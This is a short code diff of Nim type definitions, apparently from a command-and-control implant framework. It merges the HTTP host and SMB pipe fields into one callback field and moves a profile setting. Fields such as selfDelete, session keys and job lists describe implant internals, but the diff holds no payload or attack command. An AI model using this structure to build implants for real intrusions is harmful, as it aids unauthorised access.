@@ -23,10 +23,9 @@ type
 
     TransportSettings* = ref object 
         listenerId*: string
-        when defined(TRANSPORT_HTTP): 
-            hosts*: string
+        callback*: string               # Callback hosts or SMB pipe
+        profile*: Profile
         when defined(TRANSPORT_SMB): 
-            pipe*: string 
             hPipe*: HANDLE
 
 type
@@ -39,7 +38,6 @@ type
         selfDelete*: bool
         sessionKey*: Key
         agentPublicKey*: Key
-        profile*: Profile
         registered*: bool
         links*: Table[uint32, uint32]
         jobs*: seq[Job]
